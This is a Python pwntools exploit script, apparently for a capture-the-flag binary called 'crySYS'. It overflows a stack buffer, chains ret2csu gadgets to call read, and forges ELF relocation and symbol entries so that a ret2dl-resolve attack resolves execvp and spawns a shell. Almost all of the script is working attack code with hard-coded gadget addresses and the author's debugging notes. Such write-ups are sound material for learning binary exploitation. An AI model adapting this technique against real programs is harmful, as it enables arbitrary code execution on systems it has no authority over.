from pwn import *

# setup general settings
context.terminal = ["xfce4-terminal", "--disable-server", "-e"] 
context.arch = "amd64"

# spawn process, and read elf file
p = process("./crySYS")
bin_elf = ELF("./crySYS")


RESOLVER_ADDR = 0x4003E6 # call dl_resolve wihtout pushing link_map
# we need to create our own link_map
RESOLVER_ADDR = 0x4003E0 # push link_map and call dl_resolve
# using 0x4003E0, we dont control and modify the link_map argument
c_area        = 0x601030 # controllable area (bss segment)
fake_stack    = 0x600E18 # for rbp overwrite approach

# resolve structure offsets
SYMTAB = 0x4002B8
STRTAB = 0x400318
JMPREL = 0x4003B0

POP_RSI_POP_R15_RET = 0x400581  # needed to specify controlable area for read
MOV_EDI_CALL_READ   = 0x4004FB  # call read from stdin
# amount is not needed as rdx keeps its value after the first read call

# calling read(0, buf, 0x1000) with the first ropchain to create a
# forged Elf64_Rel and Elf64_Sym entry on a known address
'''
chain_read  = b""
chain_read += b"A"*80                   # overflow padding
chain_read += p64(fake_stack)           # fake rbp
chain_read += p64(POP_RSI_POP_R15_RET)  # set read buffer
chain_read += p64(c_area)               # ptr to controlable buffer
chain_read += b"C"*8                    # dummy r15 data
chain_read += p64(MOV_EDI_CALL_READ)    # call read
chain_read += b"D"*16   # not end of chain
# this approach does not work as rbp cannot be restored and we loose the
# connection to the rest of the rop chain...
'''

# args for read call
# read(rdi, rsi, rdx)

# second approach: calling read using ret2csu
# -> call [r12+rbx*8]
# if we write the got address of read into r12 and clear rbx
# rbp does not matter as there is no leave
'''
.text:000000000040057A 5B             pop     rbx
.text:000000000040057B 5D             pop     rbp
.text:000000000040057C 41 5C          pop     r12
.text:000000000040057E 41 5D          pop     r13
.text:0000000000400580 41 5E          pop     r14
.text:0000000000400582 41 5F          pop     r15
.text:0000000000400584 C3             retn
'''
CSU_RET    = 0x40057A
RELOC_READ = 0x601018
POP_RSI_POP_R15_RET = 0x400581  # specify controlable area for read

chain_read  = b""
chain_read += b"A"*80                   # overflow padding
chain_read += b"B"*8                    # fake rbp
chain_read += p64(CSU_RET)              # gadget (see above)
chain_read += p64(0)                    # RBX
chain_read += p64(1)                    # RBP (to pass cmp rbp, rbx after call)
chain_read += p64(RELOC_READ)           # R12 (read GOT entry)
chain_read += p64(0)                    # R13 (has to be zero for stdin read)
chain_read += p64(c_area)               # R14 (ptr to controlable buffer)
chain_read += p64(0x100)                # R15 (amount we want to read)

'''
.text:0000000000400560 4C 89 FA             mov  rdx, r15
.text:0000000000400563 4C 89 F6             mov  rsi, r14
.text:0000000000400566 44 89 EF             mov  edi, r13d
.text:0000000000400569 41 FF 14 DC          call [r12+rbx*8]
'''
CSU_CALL = 0x400560

chain_read += p64(CSU_CALL)
chain_read += b"D"*8                    # to counter (add rsp,8) after call

##### now we are back at 40057A and can prepare for the forged structs

# size(Elf64_Sym) = 24

# Compute offsets and forged structures
forged_area = c_area + 0x20                      # for sh\x00 string area

# calculate rel offset
# JMPREL_Entry = JMPREL + ( bit32(rel_offset)+bit32(rel_offset)*2 ) * 8
# rel_offset = ((JMPREL_Entry - JMPREL)/8)/3
rel_offset = int((forged_area - JMPREL)/24)   # must be divideable with zero rest
print("REL OFFSET: {}".format(hex(rel_offset)))

# create forged jmprel struct
elf64_sym_struct = forged_area + 0x28            # JMPREL Entry
index_sym = int((elf64_sym_struct - SYMTAB)/24)  # calculate index

r_info = (index_sym << 32) | 0x7                 # 7 -> plt reloc type
elf64_jmprel_struct  = p64(bin_elf.got['read'])  # just reuse read offset
elf64_jmprel_struct += p64(r_info)
elf64_jmprel_struct += p64(0)
elf64_jmprel_struct += b"P"*16                   # padd to size 40 for second 24 division

print("ELF64_JMPREL_struct:")
print(elf64_jmprel_struct)

# create forged symbol table entry
st_name = (elf64_sym_struct + 0x20) - STRTAB     # offset to "system"
elf64_sym_struct = p64(st_name) + p64(0x12) + p64(0) + p64(0)

print("ELF64_SYM_struct:")
print(elf64_sym_struct)

# OFF = JMPREL + ( bit32(A)+bit32(A)*2 ) * 8
# read [OFF]
# read [OFF + 8]

# for "read" it those two values 
# LOAD:04003B0  Elf64_Rela <601018h, 100000007h, 0> ; R_X86_64_JUMP_SLOT read
# Entry 0: Plt.Got address (where to place resolved address)
# Entry 1: idk

# (Entry 1 >> 32) # calculates index for symbol table
# 0x100000007 >> 32 = 1

# we are starting at
'''
.text:000000000040057A 5B             pop     rbx
.text:000000000040057B 5D             pop     rbp
.text:000000000040057C 41 5C          pop     r12
.text:000000000040057E 41 5D          pop     r13
.text:0000000000400580 41 5E          pop     r14
.text:0000000000400582 41 5F          pop     r15
.text:0000000000400584 C3             retn
'''
# we can simply fill it with padding

POP_RDI = 0x400583

chain_read += b"P"*8*6                  # Padding
chain_read += p64(POP_RDI)              # pop resolver arg
chain_read += p64(c_area)               # sh string
chain_read += p64(POP_RSI_POP_R15_RET)  # empty args str
chain_read += p64(c_area+2)             # null ptr arg to execvp
chain_read += b"R"*8                    # dummy r5
chain_read += p64(RESOLVER_ADDR)        # call resolver
# chain_read += b"L"*8                  # link_map arg (using orignial link_map)
chain_read += p64(rel_offset)           # reloc_index arg
chain_read += b"E"*16                   # end of chain

# hopefully pops shell after here


# second chain to forged structs and call dl-resolve
#the dl-resolve hack
chain_structs  = b"sh\x00"            # bin sh string as argument to resolver
chain_structs += p64(0)               # for execvp testing
chain_structs += b"P"*21              # padding to length 24
chain_structs += elf64_jmprel_struct  # forged jmprel entry struct
chain_structs += elf64_sym_struct     # forged symbol table struct
#chain_structs += b"system\x00"        # function to resolve
chain_structs += b"execvp\x00"
chain_structs += b"X"*16              # end of forged struct


print("Read Chain:")
print(chain_read)
print("")

print("Structs Chain:")
print(chain_structs)


#offset = 0x400505     # bp at leave
offset = 0x400506     # bp at ret
gdb.attach(p, r2cmd="db {}".format(hex(offset)))

# send read chain, first payload
p.send(chain_read)

raw_input("wait for second read")

# send forged structs chain, second payload
p.send(chain_structs) # contains forged structs

# keep process alive
p.interactive()


# System offset: 0x4f4e0
# execvp offset: 0xE5350
# "system" does not give me a shell somehow, but execvp does :D

'''
https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#65
'''